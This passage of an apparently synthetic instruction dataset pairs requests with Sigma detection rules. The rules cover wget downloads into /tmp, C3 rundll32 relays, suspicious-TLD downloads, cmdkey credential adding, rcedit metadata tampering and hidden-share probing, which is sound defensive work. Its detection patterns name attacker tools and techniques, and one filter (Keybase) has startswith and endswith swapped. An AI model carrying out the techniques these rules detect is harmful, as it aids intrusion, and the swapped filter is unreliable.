    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        TargetFilename|startswith:\n            - '/tmp/'\n            - '/var/tmp/'\n    condition: selection\nfalsepositives:\n    - Legitimate downloads of files in the tmp folder.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        TargetFilename|startswith:\n            - '/tmp/'\n            - '/var/tmp/'\n    condition: selection\nfalsepositives:\n    - Legitimate downloads of files in the tmp folder.\nlevel: medium\n",
      "question": "use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\"",
      "answer": "In order to detect the use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\", you should: Monitor Linux file events for instances where the application 'wget' is used to download files, specifically when these files are being saved into temporary directories like \"/tmp\" or \"/var/tmp\". It is important to note that there could be legitimate reasons for files to be downloaded into these directories, and such instances should be considered as potential false positives. The detection process relies on identifying events where the command or process name ends with '/wget' and the target filenames start with '/tmp/' or '/var/tmp/'. This monitoring activity is of a medium priority level and targets tactics and techniques related to the execution and defense evasion, which are indicated by the utilization of 'wget' for the purpose of dropping files into directories that are commonly used for temporary storage but could also be employed for malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting F-Secure C3 produces DLLs with a default exported StartNodeRelay function..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential misuse of F-Secure C3 produced DLLs, which contain a default exported StartNodeRelay function, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the command line includes 'rundll32.exe', followed by any '.dll' file, and particularly the 'StartNodeRelay' function being called. This activity is critical to observe as it could be indicative of an attacker leveraging F-Secure C3 functionalities for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - '.dll'\n            - 'StartNodeRelay'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - '.dll'\n            - 'StartNodeRelay'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "F-Secure C3 produces DLLs with a default exported StartNodeRelay function.",
      "answer": "In order to detect potential misuse of F-Secure C3 produced DLLs, which contain a default exported StartNodeRelay function, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the command line includes 'rundll32.exe', followed by any '.dll' file, and particularly the 'StartNodeRelay' function being called. This activity is critical to observe as it could be indicative of an attacker leveraging F-Secure C3 functionalities for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting download of certain file types from hosts in suspicious TLDs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect download of certain file types from hosts in suspicious TLDs, you should focus on monitoring proxy server logs for download activities involving specific file extensions and originating from hosts in certain Top-Level Domains (TLDs) deemed suspicious. The log source of interest is primarily proxy logs, which can provide insights into web requests and the contents being downloaded. The detection process involves identifying web requests for files with particular extensions known to be commonly used in malicious activities or for malware propagation. These extensions include executable files (.exe), scripts (.vbs, .bat, .ps1), compressed archives (.rar, .zip), document files that can contain malicious macros (.doc, .docm, .xls, .xlsm, .pptm), and other types that might be abused for cyber-attacks (.rtf, .hta, .dll, .ws, .wsf, .sct).\n\nAdditionally, the detection focuses on the source of the downloads, specifically looking for hosts within TLDs that have been associated with suspicious activities or are frequently used by attackers. This list includes a wide range of TLDs, such as .country, .stream, .gdn, and many others, which have been identified through various analyses and reports from cybersecurity organizations like Symantec, McAfee, and Spamhaus. This comprehensive list of suspicious TLDs aims to cover a broad spectrum of domains that could be potentially harmful.\n\nThe condition for detection is the occurrence of web requests that match both the specified file extensions and originate from the listed suspicious TLDs. To accurately identify and investigate potential threats, the fields of interest that should be extracted from the logs include the ClientIP address and the full URI (Uniform Resource Identifier) of the requested file. \n\nIt is important to note that while this detection method aims to spotlight potentially malicious activities, it may also yield false positives. Such false positives could stem from legitimate software downloads that coincidentally match the criteria. Thus, a low severity level is suggested for alerts generated by this detection method to encourage further investigation rather than immediate drastic action.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri-extension:\n            - 'exe'\n            - 'vbs'\n            - 'bat'\n            - 'rar'\n            - 'ps1'\n            - 'doc'\n            - 'docm'\n            - 'xls'\n            - 'xlsm'\n            - 'pptm'\n            - 'rtf'\n            - 'hta'\n            - 'dll'\n            - 'ws'\n            - 'wsf'\n            - 'sct'\n            - 'zip'\n            # If you want to add more extensions - see https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/\n        cs-host|endswith:\n            # Symantec / Chris Larsen analysis\n            - '.country'\n            - '.stream'\n            - '.gdn'\n            - '.mom'\n            - '.xin'\n            - '.kim'\n            - '.men'\n            - '.loan'\n            - '.download'\n            - '.racing'\n            - '.online'\n            - '.science'\n            - '.ren'\n            - '.gb'\n            - '.win'\n            - '.top'\n            - '.review'\n            - '.vip'\n            - '.party'\n            - '.tech'\n            - '.xyz'\n            - '.date'\n            - '.faith'\n            - '.zip'\n            - '.cricket'\n            - '.space'\n            # McAfee report\n            - '.info'\n            - '.vn'\n            - '.cm'\n            - '.am'\n            - '.cc'\n            - '.asia'\n            - '.ws'\n            - '.tk'\n            - '.biz'\n            - '.su'\n            - '.st'\n            - '.ro'\n            - '.ge'\n            - '.ms'\n            - '.pk'\n            - '.nu'\n            - '.me'\n            - '.ph'\n            - '.to'\n            - '.tt'\n            - '.name'\n            - '.tv'\n            - '.kz'\n            - '.tc'\n            - '.mobi'\n            # Spamhaus\n            - '.study'\n            - '.click'\n            - '.link'\n            - '.trade'\n            - '.accountant'\n            # Spamhaus 2018 https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/\n            - '.cf'\n            - '.gq'\n            - '.ml'\n            - '.ga'\n            # Custom\n            - '.pw'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\nfalsepositives:\n    - All kinds of software downloads\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri-extension:\n            - 'exe'\n            - 'vbs'\n            - 'bat'\n            - 'rar'\n            - 'ps1'\n            - 'doc'\n            - 'docm'\n            - 'xls'\n            - 'xlsm'\n            - 'pptm'\n            - 'rtf'\n            - 'hta'\n            - 'dll'\n            - 'ws'\n            - 'wsf'\n            - 'sct'\n            - 'zip'\n            # If you want to add more extensions - see https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/\n        cs-host|endswith:\n            # Symantec / Chris Larsen analysis\n            - '.country'\n            - '.stream'\n            - '.gdn'\n            - '.mom'\n            - '.xin'\n            - '.kim'\n            - '.men'\n            - '.loan'\n            - '.download'\n            - '.racing'\n            - '.online'\n            - '.science'\n            - '.ren'\n            - '.gb'\n            - '.win'\n            - '.top'\n            - '.review'\n            - '.vip'\n            - '.party'\n            - '.tech'\n            - '.xyz'\n            - '.date'\n            - '.faith'\n            - '.zip'\n            - '.cricket'\n            - '.space'\n            # McAfee report\n            - '.info'\n            - '.vn'\n            - '.cm'\n            - '.am'\n            - '.cc'\n            - '.asia'\n            - '.ws'\n            - '.tk'\n            - '.biz'\n            - '.su'\n            - '.st'\n            - '.ro'\n            - '.ge'\n            - '.ms'\n            - '.pk'\n            - '.nu'\n            - '.me'\n            - '.ph'\n            - '.to'\n            - '.tt'\n            - '.name'\n            - '.tv'\n            - '.kz'\n            - '.tc'\n            - '.mobi'\n            # Spamhaus\n            - '.study'\n            - '.click'\n            - '.link'\n            - '.trade'\n            - '.accountant'\n            # Spamhaus 2018 https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/\n            - '.cf'\n            - '.gq'\n            - '.ml'\n            - '.ga'\n            # Custom\n            - '.pw'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\nfalsepositives:\n    - All kinds of software downloads\nlevel: low\n",
      "question": "download of certain file types from hosts in suspicious TLDs",
      "answer": "In order to detect download of certain file types from hosts in suspicious TLDs, you should focus on monitoring proxy server logs for download activities involving specific file extensions and originating from hosts in certain Top-Level Domains (TLDs) deemed suspicious. The log source of interest is primarily proxy logs, which can provide insights into web requests and the contents being downloaded. The detection process involves identifying web requests for files with particular extensions known to be commonly used in malicious activities or for malware propagation. These extensions include executable files (.exe), scripts (.vbs, .bat, .ps1), compressed archives (.rar, .zip), document files that can contain malicious macros (.doc, .docm, .xls, .xlsm, .pptm), and other types that might be abused for cyber-attacks (.rtf, .hta, .dll, .ws, .wsf, .sct).\n\nAdditionally, the detection focuses on the source of the downloads, specifically looking for hosts within TLDs that have been associated with suspicious activities or are frequently used by attackers. This list includes a wide range of TLDs, such as .country, .stream, .gdn, and many others, which have been identified through various analyses and reports from cybersecurity organizations like Symantec, McAfee, and Spamhaus. This comprehensive list of suspicious TLDs aims to cover a broad spectrum of domains that could be potentially harmful.\n\nThe condition for detection is the occurrence of web requests that match both the specified file extensions and originate from the listed suspicious TLDs. To accurately identify and investigate potential threats, the fields of interest that should be extracted from the logs include the ClientIP address and the full URI (Uniform Resource Identifier) of the requested file. \n\nIt is important to note that while this detection method aims to spotlight potentially malicious activities, it may also yield false positives. Such false positives could stem from legitimate software downloads that coincidentally match the criteria. Thus, a low severity level is suggested for alerts generated by this detection method to encourage further investigation rather than immediate drastic action."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious session with two users present.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious sessions with two users present, you should focus on monitoring logs from Linux systems, specifically those that pertain to the Guacamole service. The detection mechanism hinges on the identification of logs that explicitly mention \"2 users now present.\" This phrase serves as a key indicator that a session may be compromised or suspicious due to the presence of an unexpected additional user. Since Guacamole is often employed for remote desktop access, any indication of an unexpected second user could suggest a security breach or an unauthorized access attempt.\n\nIt's vital to note that the detection strategy is classified with a high level of importance, suggesting such occurrences are taken seriously and should be investigated promptly. However, due to the broad and somewhat unspecified nature of this detection method, it is acknowledged that there might be unknown false positives. This means that while alerts generated from this detection method require investigation, not all will necessarily correlate with malicious activity. The vigilance in monitoring and analyzing Guacamole service logs for the mentioned phrase will be a critical step in identifying potential breaches attempting to utilize or exploit remote access services in a Linux environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: guacamole\ndetection:\n    selection:\n        - '(2 users now present)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: guacamole\ndetection:\n    selection:\n        - '(2 users now present)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious session with two users present",
      "answer": "In order to detect suspicious sessions with two users present, you should focus on monitoring logs from Linux systems, specifically those that pertain to the Guacamole service. The detection mechanism hinges on the identification of logs that explicitly mention \"2 users now present.\" This phrase serves as a key indicator that a session may be compromised or suspicious due to the presence of an unexpected additional user. Since Guacamole is often employed for remote desktop access, any indication of an unexpected second user could suggest a security breach or an unauthorized access attempt.\n\nIt's vital to note that the detection strategy is classified with a high level of importance, suggesting such occurrences are taken seriously and should be investigated promptly. However, due to the broad and somewhat unspecified nature of this detection method, it is acknowledged that there might be unknown false positives. This means that while alerts generated from this detection method require investigation, not all will necessarily correlate with malicious activity. The vigilance in monitoring and analyzing Guacamole service logs for the mentioned phrase will be a critical step in identifying potential breaches attempting to utilize or exploit remote access services in a Linux environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting raw disk access using uncommon tools or tools that are located in suspicious locations (heavy filtering is required), which could indicate possible defense evasion attempts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect raw disk access using uncommon tools or tools that are located in suspicious locations, which could indicate possible defense evasion attempts, you should monitor for executions from locations not commonly associated with legitimate system processes or common software installations. Windows operating systems have predefined locations for system files, applications, and processes critical for their operation, such as 'C:\\Program Files\\', 'C:\\Windows\\System32\\', and similar directories. Processes executing from these locations are generally considered safe. However, to spot potentially malicious activity, look for executions occurring outside these trusted paths, especially from removable devices like floppy drives, temporary directories such as 'C:\\Windows\\Temp\\', or less monitored user data folders like those under 'C:\\Users\\'.\n\nYou should also pay attention to processes that attempt to disguise themselves as legitimate system update files or processes (e.g., 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' related to Windows upgrade or update), yet located in atypical directories, or leveraging application data paths (e.g., paths containing '\\AppData\\Microsoft\\'). Such tactics might be employed by attackers to evade detection mechanisms by blending in with normal system update operations.\n\nAdditionally, keep an eye out for specific executable names and paths that have been flagged as uncommon points of execution for otherwise legitimate tools, for instance, the GitHub Desktop application executing from an unusual path like 'C:\\Users\\[Username]\\AppData\\Local\\GitHubDesktop\\...' or tools like 'NVMEHostmetadata.exe' and 'SSDUpdate.exe' running from 'C:\\Windows\\Temp\\' which might indicate an attempt to modify system or disk components covertly.\n\nFurthermore, execution of tools like 'thor.exe' from directories like 'C:\\Windows\\Temp\\asgard2-agent\\' and unusual execution paths for Keybase updater ('upd.exe') could signify unauthorized or suspicious activities. \n\nMonitoring for these indicators necessitates a nuanced understand of normal system and user behavior to minimize false positives, as legitimate software installations, updates, or administrative activities may occasionally use similar paths or patterns. However, consistent or repeated detection of such patterns warrants further investigation. Tags such as \"Defense Evasion\" and \"Execution\" from the MITRE ATT&CK framework are pertinent here, as they help categorize the detected activities into broader tactics and techniques used by adversaries to bypass security measures and execute malicious payloads or scripts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: raw_access_thread\ndetection:\n    filter_main_floppy:\n        Device|contains: floppy\n    filter_main_generic:\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SystemApps\\'\n            - 'C:\\Windows\\WinSxS\\'\n            - 'C:\\Windows\\servicing\\'\n            - 'C:\\Windows\\CCM\\'\n            - 'C:\\Windows\\uus\\'\n    filter_main_setuphost:\n        Image: 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' # Related to Windows Upgrade/Update\n    filter_main_system_images:\n        Image:\n            - 'System'\n            - 'Registry'\n    filter_main_specific:\n        Image: 'C:\\Windows\\explorer.exe'\n    filter_main_windefender:\n        Image|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        Image|endswith: '\\MsMpEng.exe'\n    filter_main_microsoft_appdata:\n        Image|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\'\n            - '\\Microsoft\\'\n    filter_main_windows_update_box:\n        # ParentCommandLine: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wuauserv\n        # Related to Windows Upgrade/Update\n        Image|startswith: 'C:\\Windows\\SoftwareDistribution\\Download'\n        Image|endswith: '\\WindowsUpdateBox.exe'\n    filter_main_ssd_nvme:\n        Image|startswith: 'C:\\Windows\\Temp\\'\n        Image|endswith:\n            - '\\HostMetadata\\NVMEHostmetadata.exe'\n            - '\\Executables\\SSDUpdate.exe'\n    filter_optional_github_desktop:\n        Image|startswith: 'C:\\Users\\'\n        Image|contains: '\\AppData\\Local\\GitHubDesktop\\app-'\n        Image|endswith: '\\resources\\app\\git\\mingw64\\bin\\git.exe'\n    filter_optional_nextron:\n        Image|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        Image|endswith: '\\thor.exe'\n    filter_optional_Keybase:\n        Image|endswith: 'C:\\Users\\'\n        Image|startswith: '\\AppData\\Local\\Keybase\\upd.exe'\n    condition: not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Likely\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: raw_access_thread\ndetection:\n    filter_main_floppy:\n        Device|contains: floppy\n    filter_main_generic:\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SystemApps\\'\n            - 'C:\\Windows\\WinSxS\\'\n            - 'C:\\Windows\\servicing\\'\n            - 'C:\\Windows\\CCM\\'\n            - 'C:\\Windows\\uus\\'\n    filter_main_setuphost:\n        Image: 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' # Related to Windows Upgrade/Update\n    filter_main_system_images:\n        Image:\n            - 'System'\n            - 'Registry'\n    filter_main_specific:\n        Image: 'C:\\Windows\\explorer.exe'\n    filter_main_windefender:\n        Image|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        Image|endswith: '\\MsMpEng.exe'\n    filter_main_microsoft_appdata:\n        Image|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\'\n            - '\\Microsoft\\'\n    filter_main_windows_update_box:\n        # ParentCommandLine: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wuauserv\n        # Related to Windows Upgrade/Update\n        Image|startswith: 'C:\\Windows\\SoftwareDistribution\\Download'\n        Image|endswith: '\\WindowsUpdateBox.exe'\n    filter_main_ssd_nvme:\n        Image|startswith: 'C:\\Windows\\Temp\\'\n        Image|endswith:\n            - '\\HostMetadata\\NVMEHostmetadata.exe'\n            - '\\Executables\\SSDUpdate.exe'\n    filter_optional_github_desktop:\n        Image|startswith: 'C:\\Users\\'\n        Image|contains: '\\AppData\\Local\\GitHubDesktop\\app-'\n        Image|endswith: '\\resources\\app\\git\\mingw64\\bin\\git.exe'\n    filter_optional_nextron:\n        Image|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        Image|endswith: '\\thor.exe'\n    filter_optional_Keybase:\n        Image|endswith: 'C:\\Users\\'\n        Image|startswith: '\\AppData\\Local\\Keybase\\upd.exe'\n    condition: not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Likely\nlevel: low\n",
      "question": "raw disk access using uncommon tools or tools that are located in suspicious locations (heavy filtering is required), which could indicate possible defense evasion attempts",
      "answer": "In order to detect raw disk access using uncommon tools or tools that are located in suspicious locations, which could indicate possible defense evasion attempts, you should monitor for executions from locations not commonly associated with legitimate system processes or common software installations. Windows operating systems have predefined locations for system files, applications, and processes critical for their operation, such as 'C:\\Program Files\\', 'C:\\Windows\\System32\\', and similar directories. Processes executing from these locations are generally considered safe. However, to spot potentially malicious activity, look for executions occurring outside these trusted paths, especially from removable devices like floppy drives, temporary directories such as 'C:\\Windows\\Temp\\', or less monitored user data folders like those under 'C:\\Users\\'.\n\nYou should also pay attention to processes that attempt to disguise themselves as legitimate system update files or processes (e.g., 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' related to Windows upgrade or update), yet located in atypical directories, or leveraging application data paths (e.g., paths containing '\\AppData\\Microsoft\\'). Such tactics might be employed by attackers to evade detection mechanisms by blending in with normal system update operations.\n\nAdditionally, keep an eye out for specific executable names and paths that have been flagged as uncommon points of execution for otherwise legitimate tools, for instance, the GitHub Desktop application executing from an unusual path like 'C:\\Users\\[Username]\\AppData\\Local\\GitHubDesktop\\...' or tools like 'NVMEHostmetadata.exe' and 'SSDUpdate.exe' running from 'C:\\Windows\\Temp\\' which might indicate an attempt to modify system or disk components covertly.\n\nFurthermore, execution of tools like 'thor.exe' from directories like 'C:\\Windows\\Temp\\asgard2-agent\\' and unusual execution paths for Keybase updater ('upd.exe') could signify unauthorized or suspicious activities. \n\nMonitoring for these indicators necessitates a nuanced understand of normal system and user behavior to minimize false positives, as legitimate software installations, updates, or administrative activities may occasionally use similar paths or patterns. However, consistent or repeated detection of such patterns warrants further investigation. Tags such as \"Defense Evasion\" and \"Execution\" from the MITRE ATT&CK framework are pertinent here, as they help categorize the detected activities into broader tactics and techniques used by adversaries to bypass security measures and execute malicious payloads or scripts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of cmdkey to add generic credentials. As an example, this has to be used before connecting to an RDP session via command line interface..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of cmdkey to add generic credentials, which is a common preparation step before connecting to an RDP session via command line interface, you should: Monitor for process creation events on Windows systems, specifically looking for the execution of 'cmdkey.exe'. Pay close attention when the command line for 'cmdkey.exe' includes the parameters '/g' (generic credential), '/u' (user), and '/p' (password). This unusual combination of parameters suggests an attempt to add generic credentials, and while it can be a legitimate administrative action, it could also indicate malicious activity aiming to establish persistence or facilitate lateral movement within a network. It's critical to evaluate these incidents in the context of other related activity on the system to distinguish between benign and suspicious uses.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' /g'\n            - ' /u'\n            - ' /p'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' /g'\n            - ' /u'\n            - ' /p'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium\n",
      "question": "usage of cmdkey to add generic credentials. As an example, this has to be used before connecting to an RDP session via command line interface.",
      "answer": "In order to detect usage of cmdkey to add generic credentials, which is a common preparation step before connecting to an RDP session via command line interface, you should: Monitor for process creation events on Windows systems, specifically looking for the execution of 'cmdkey.exe'. Pay close attention when the command line for 'cmdkey.exe' includes the parameters '/g' (generic credential), '/u' (user), and '/p' (password). This unusual combination of parameters suggests an attempt to add generic credentials, and while it can be a legitimate administrative action, it could also indicate malicious activity aiming to establish persistence or facilitate lateral movement within a network. It's critical to evaluate these incidents in the context of other related activity on the system to distinguish between benign and suspicious uses."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of rcedit to potentially alter executable PE metadata properties, which could conceal efforts to rename system utilities for defense evasion..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of rcedit to potentially alter executable PE metadata properties, which could conceal efforts to rename system utilities for defense evasion, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where processes are created with images ending in '\\rcedit-x64.exe' or '\\rcedit-x86.exe'. These executables are associated with rcedit, a tool that can edit resources of another executable. Pay attention not only to the name and path of the executable but also to the command line arguments. Specifically, look for command line arguments containing '--set-', which is indicative of commands used to edit various metadata properties of an executable, like setting resource strings or version strings.\n\nFurther investigation should focus on command line arguments that include modifications to metadata attributes such as 'OriginalFileName', 'CompanyName', 'FileDescription', 'ProductName', 'ProductVersion', and 'LegalCopyright'. These attributes are critical since changes to them can be used by an attacker to disguise malicious binaries as legitimate system utilities, facilitating defense evasion.\n\nHowever, it's important to consider that the rcedit tool might also be legitimately used by administrators or software developers to update binary metadata. Therefore, occurrences of such process creations should be analyzed in the context of their environment to discern between legitimate uses and potentially malicious activities.\n\nThis monitoring strategy leverages Windows process creation logs to identify attempts to misuse the rcedit tool for altering executable properties in a manner that could aid in evading defenses by renaming or otherwise disguising system utilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\rcedit-x64.exe'\n            - '\\rcedit-x86.exe'\n        - Description: 'Edit resources of exe'\n        - Product: 'rcedit'\n    selection_flags:\n        CommandLine|contains: '--set-' # Covers multiple edit commands such as \"--set-resource-string\" or \"--set-version-string\"\n    selection_attributes:\n        CommandLine|contains:\n            - 'OriginalFileName'\n            - 'CompanyName'\n            - 'FileDescription'\n            - 'ProductName'\n            - 'ProductVersion'\n            - 'LegalCopyright'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the tool by administrators or users to update metadata of a binary\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\rcedit-x64.exe'\n            - '\\rcedit-x86.exe'\n        - Description: 'Edit resources of exe'\n        - Product: 'rcedit'\n    selection_flags:\n        CommandLine|contains: '--set-' # Covers multiple edit commands such as \"--set-resource-string\" or \"--set-version-string\"\n    selection_attributes:\n        CommandLine|contains:\n            - 'OriginalFileName'\n            - 'CompanyName'\n            - 'FileDescription'\n            - 'ProductName'\n            - 'ProductVersion'\n            - 'LegalCopyright'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the tool by administrators or users to update metadata of a binary\nlevel: medium\n",
      "question": "use of rcedit to potentially alter executable PE metadata properties, which could conceal efforts to rename system utilities for defense evasion.",
      "answer": "In order to detect the use of rcedit to potentially alter executable PE metadata properties, which could conceal efforts to rename system utilities for defense evasion, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where processes are created with images ending in '\\rcedit-x64.exe' or '\\rcedit-x86.exe'. These executables are associated with rcedit, a tool that can edit resources of another executable. Pay attention not only to the name and path of the executable but also to the command line arguments. Specifically, look for command line arguments containing '--set-', which is indicative of commands used to edit various metadata properties of an executable, like setting resource strings or version strings.\n\nFurther investigation should focus on command line arguments that include modifications to metadata attributes such as 'OriginalFileName', 'CompanyName', 'FileDescription', 'ProductName', 'ProductVersion', and 'LegalCopyright'. These attributes are critical since changes to them can be used by an attacker to disguise malicious binaries as legitimate system utilities, facilitating defense evasion.\n\nHowever, it's important to consider that the rcedit tool might also be legitimately used by administrators or software developers to update binary metadata. Therefore, occurrences of such process creations should be analyzed in the context of their environment to discern between legitimate uses and potentially malicious activities.\n\nThis monitoring strategy leverages Windows process creation logs to identify attempts to misuse the rcedit tool for altering executable properties in a manner that could aid in evading defenses by renaming or otherwise disguising system utilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting repeated failed (outgoing) attempts to mount a hidden share.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect repeated failed (outgoing) attempts to mount a hidden share, you should monitor security events from the Windows SMB client service. Focus on events with the EventID 31010, which signal such attempts. Specifically, look for attempts to access shares that are named with a trailing dollar sign ('$'), indicating they are hidden shares. If you observe more than 10 of these attempts within a 1-minute timeframe, it's indicative of a suspicious activity that may represent an adversary trying to gain access to sensitive areas of the network. Capture and review the ShareName involved in these attempts to understand the target of these access attempts better.\n\nHowever, keep in mind that not all activities caught by this monitoring might be malicious. Legitimate administrative activities often necessitate accessing hidden shares, and sometimes scripts designed to automate tasks might mistakenly attempt to access these shares repeatedly, leading to false positives. The severity level for alerts generated based on this monitoring is considered medium, reflecting the balance between the potential for malicious activity and the likelihood of legitimate explanations for the detected behavior. \n\nThis detection strategy aligns with mitigating tactics and techniques that include, but are not limited to, Initial Access and Execution, as attackers might be attempting to use compromised credentials to access hidden network shares during their campaign.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: smbclient-security\ndetection:\n    selection:\n        EventID: 31010\n        ShareName|endswith: '$'\n    timeframe: 1m\n    condition: selection | count() > 10\nfields:\n    - ShareName\nfalsepositives:\n    - Legitimate administrative activity\n    - Faulty scripts\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: smbclient-security\ndetection:\n    selection:\n        EventID: 31010\n        ShareName|endswith: '$'\n    timeframe: 1m\n    condition: selection | count() > 10\nfields:\n    - ShareName\nfalsepositives:\n    - Legitimate administrative activity\n    - Faulty scripts\nlevel: medium\n",
      "question": "repeated failed (outgoing) attempts to mount a hidden share",
      "answer": "In order to detect repeated failed (outgoing) attempts to mount a hidden share, you should monitor security events from the Windows SMB client service. Focus on events with the EventID 31010, which signal such attempts. Specifically, look for attempts to access shares that are named with a trailing dollar sign ('$'), indicating they are hidden shares. If you observe more than 10 of these attempts within a 1-minute timeframe, it's indicative of a suspicious activity that may represent an adversary trying to gain access to sensitive areas of the network. Capture and review the ShareName involved in these attempts to understand the target of these access attempts better.\n\nHowever, keep in mind that not all activities caught by this monitoring might be malicious. Legitimate administrative activities often necessitate accessing hidden shares, and sometimes scripts designed to automate tasks might mistakenly attempt to access these shares repeatedly, leading to false positives. The severity level for alerts generated based on this monitoring is considered medium, reflecting the balance between the potential for malicious activity and the likelihood of legitimate explanations for the detected behavior. \n\nThis detection strategy aligns with mitigating tactics and techniques that include, but are not limited to, Initial Access and Execution, as attackers might be attempting to use compromised credentials to access hidden network shares during their campaign."
    }
  },
  {
